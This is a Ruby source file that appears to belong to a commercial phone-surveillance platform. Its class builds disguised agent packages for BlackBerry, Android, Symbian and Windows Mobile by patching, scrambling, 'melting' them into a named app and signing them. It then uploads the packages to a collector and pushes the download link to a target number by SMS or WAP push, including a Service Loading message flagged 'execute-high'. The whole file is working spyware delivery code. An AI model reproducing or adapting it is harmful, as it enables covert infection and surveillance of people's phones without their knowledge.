#
# Wap PUSH messages
#

require_relative '../frontend'

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildWap < Build

  def initialize
    super
    @platform = 'wap'
  end

  def load(params)
    trace :debug, "Build: load: #{params}"

    params['platform'] = @platform
    super
  end

  def generate(params)
    trace :debug, "Build: generate: #{params}"

    # force demo if the RMI is in demo
    params['binary']['demo'] = true if LicenseManager.instance.limits[:rmi][1]

    # don't include support files into the outputs
    @outputs = []
    @appname = params['melt']['appname']

    raise "don't know what to build" if params['platforms'].nil? or params['platforms'].empty?

    params['platforms'].each do |platform|
      build = Build.factory(platform.to_sym)

      build.load({'_id' => @factory._id})
      build.unpack
      begin
        build.patch params['binary'].dup
      rescue NoLicenseError => e
        trace :warn, "Build: generate: #{e.message}"
        build.clean
        next
      end
      build.scramble
      build.melt params['melt'].dup
      build.sign params['sign'].dup

      outs = build.outputs

      # purge the unneeded files
      case platform
        when 'blackberry'
          outs.keep_if {|o| o['.cod'] or o['.jad'] }
          outs.delete_if {|o| o['res']}
        when 'android'
          outs.keep_if {|o| o['.apk']}
        when 'symbian'
          outs.keep_if {|o| o['.sisx']}
          outs.delete_if {|o| o['5th'] or o['3rd'] or o['symbian3']}
        when 'winmo'
          outs.keep_if {|o| o['.cab']}
      end
      
      # copy the outputs in our directory
      outs.each do |o|
        FileUtils.cp(File.join(build.tmpdir, o), path(o))
        @outputs << o
      end

      build.clean
    end

  end

  def deliver(params)
    trace :debug, "Build: deliver: #{params} #{@outputs}"

    # zip all the outputs and send them to the collector
    # it will create a subdir automatically
    Zip::File.open(path("#{@appname}.zip"), Zip::File::CREATE) do |z|
      @outputs.each do |o|
        z.file.open("#{o}", "wb") { |f| f.write File.open(path(o), 'rb') {|f| f.read} }
      end
    end

    # send only this file to the collector
    content = File.open(path("#{@appname}.zip"), 'rb') {|f| f.read}
    Frontend.collector_put("#{@appname}.zip", content, @factory, params['user'])

    # sanitize the phone number (no + and no 00 )
    number = params['number']
    number.gsub! /\+/, ''
    number.gsub! /^00/, ''

    # send the sms
    begin
      case params['type']
        when 'sms'
          utf16_content = "#{params['text']} #{params['link']}".to_utf16le
          File.open(path('sms.txt'), "wb") {|f| f.write utf16_content}
          CrossPlatform.exec path('wps'), "-s sms -n #{number} -T #{path('sms.txt')}"
        when 'sl'
          CrossPlatform.exec path('wps'), "-s sl -r execute-high -n #{number} -l #{params['link']}"
        when 'si'
          time = (Time.now - 3600).strftime "%Y-%m-%dT%H:%M:%S"
          CrossPlatform.exec path('wps'), "-s si -r signal-high -n #{number} -l #{params['link']} -t \"#{params['text']}\" -d #{time}"
      end
    rescue ExecFailed => e
      trace :error, e.message
      error = "SMS delivery failed: "
      case e.exitstatus
        when 1
          raise error + "modem error, function not supported or network error"
        when 2
          raise error + "message encoding error"
        when 3
          raise error + "argument error"
        when 4
          raise error + "wrong command line"
        when 5
          raise error + "wrong PIN code"
        when 6
          raise error + "wrong service type"
        when 7
          raise error + "option not available on this modem"
        when 8
          raise error + "network error"
        when 9
          raise error + "modem not found"
        when 10
          raise error + "modem disconnected from the network"
        when 11
          raise error + "message too long to fit"
      end
    end

  end

end

end #DB::
end #RCS::
